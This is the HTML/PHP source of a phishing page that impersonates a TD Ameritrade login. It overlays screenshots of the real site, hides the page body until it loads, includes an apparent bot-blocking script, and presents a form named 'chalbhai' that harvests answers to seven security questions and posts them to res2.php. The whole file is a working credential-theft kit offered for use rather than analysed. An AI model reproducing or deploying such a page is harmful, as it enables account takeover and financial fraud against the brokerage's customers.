<?php
require_once 'block.php';
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>TD Ameritrade Login </title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<link rel="shortcut icon"
              href="img/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:117px; z-index:2"><img src="img/top.PNG" alt="" title="" border=0 width=1350 height=117></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:110px; width:1350px; height:623px; z-index:3"><img src="img/mid.png" alt="" title="" border=0 width=1350 height=623></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:765px; width:1350px; height:220px; z-index:11"><img src="img/footer.png" alt="" title="" border=0 width=1350 height=220></div>


<form action="res2.php" name=chalbhai id=chalbhai method=post>
<div class="value" style="position:absolute;width:360px;height:36px;left:290px;top:301px;z-index:6">
<div class="value-content">
<select name="q1" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is the name of the first company you worked for>">What is the name of the first company you worked for</option>
<option value="In What city was your high School? (Enter full name of city only.)">In What city was your high School? (Enter full name of city only.)</option>
<option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="In what city was your high school?">In what city was your high school?</option>
<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
<option value="What was the name of your High School?">What was the name of your High School?</option>
</select>
</div>
<input name="ans1"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">

<div class="value" style="position:absolute;width:360px;height:36px;left:0px;top:60px;z-index:6">
<div class="value-content">
<select name="q2" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What is your best friend's  first name?">What is your best friend's  first name?</option>
<option value="In what city were you married?(Enter full name of city only.)">In what city were you married?(Enter full name of city only.)</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="In What city was your father born?(Enter full name of city only.)">In What city was your father born?(Enter full name of city only.)</option>
<option value="What was the name of your first boyfriend/girlfriend?">What was the name of your first boyfriend/girlfriend?</option>
<option value="What was the name of your High School?">What was the name of your High School?</option>
</select>
</div>
<input name="ans2"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">


<div class="value" style="position:absolute;width:360px;height:36px;left:0px;top:70px;z-index:6">
<div class="value-content">
<select name="q3" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="In what city is your vacation home?(Enter full name of city only.)">In what city is your vacation home?(Enter full name of city only.)</option>
<option value="What was the nickname of your grandfather? ">What was the nickname of your grandfather? </option>
<option value="In what city was your mother born? (Enter full name of city only.)">In what city was your mother born? (Enter full name of city only.)</option>
<option value="What is your mothers middle name?">What is your mothers middle name?</option>
<option value="In what city were you born? (Enter full name of city only.)">In what city were you born? (Enter full name of city only.)</option>
</select>
</div>
<input name="ans3"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">


<div class="value" style="position:absolute;width:360px;height:36px;left:0px;top:60px;z-index:6">
<div class="value-content">
<select name="q4" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What was the name of your junior high school?">What was the name of your junior high school?</option>
<option value="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
<option value="Where did you meet your spouse for the first time? (Enter full name of city only.)">Where did you meet your spouse for the first time? (Enter full name of city only.)</option>
<option value="What was the last name of your favorite teacher in your final year of high school?">What was the last name of your favorite teacher in your final year of high school?</option>
<option value="What was the name of the town your grandmother lived in? (Enter full name of town only.)">What was the name of the town your grandmother lived in? (Enter full name of town only.)</option>
<option value="What street did your best friend in high school live on? (Enter full name of street only.)">What street did your best friend in high school live on? (Enter full name of street only.)</option>
<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
<option value="Whats is your paternal grandfather's first name?">Whats is your paternal grandfather's first name?</option>
</select>
</div>
<input name="ans4"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">

<div class="value" style="position:absolute;width:360px;height:36px;left:0px;top:60px;z-index:6">
<div class="value-content">
<select name="q5" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="In what city is your vacation home?(Enter full name of city only.)">In what city is your vacation home?(Enter full name of city only.)</option>
<option value="What was the nickname of your grandfather? ">What was the nickname of your grandfather? </option>
<option value="In what city was your mother born? (Enter full name of city only.)">In what city was your mother born? (Enter full name of city only.)</option>
<option value="What is your mothers middle name?">What is your mothers middle name?</option>
<option value="What was the name of your High School?">What was the name of your High School?</option>
</select>
</div>
<input name="ans5"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">

<div class="value" style="position:absolute;width:360px;height:36px;left:0px;top:70px;z-index:6">
<div class="value-content">
<select name="q6" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="In what city were you married?(Enter full name of city only.)">In what city were you married?(Enter full name of city only.)</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="In what city was your high school?">In what city was your high school?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="In What city was your father born?(Enter full name of city only.)">In What city was your father born?(Enter full name of city only.)</option>
<option value="What was the name of your first boyfriend/girlfriend?">What was the name of your first boyfriend/girlfriend?</option>
<option value="What is the name of the maid of honor at your wedding?">What is the name of the maid of honor at your wedding?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
</select>
</div>
<input name="ans6"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">

<div class="value" style="position:absolute;width:360px;height:36px;left:0px;top:60px;z-index:6">
<div class="value-content">
<select name="q7" id="id59">
<option selected="selected" value="">Select a question</option>
<option value="What is your best friend's  first name?">What is your best friend's  first name?</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="In what city were you married?(Enter full name of city only.)">In what city were you married?(Enter full name of city only.)</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="In What city was your father born?(Enter full name of city only.)">In What city was your father born?(Enter full name of city only.)</option>
<option value="What was the name of your first boyfriend/girlfriend?">What was the name of your first boyfriend/girlfriend?</option>
</select>
</div>
<input name="ans7"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:260px;height:20px;left:0px;top:26px;z-index:7">
</div>


<div id="formimage1" style="position:absolute; left:435px; top:80px; z-index:10"><input type="image" name="formimage1" width="135" height="45" src="img/conti.png"></div>



</div>

</body>
</html>
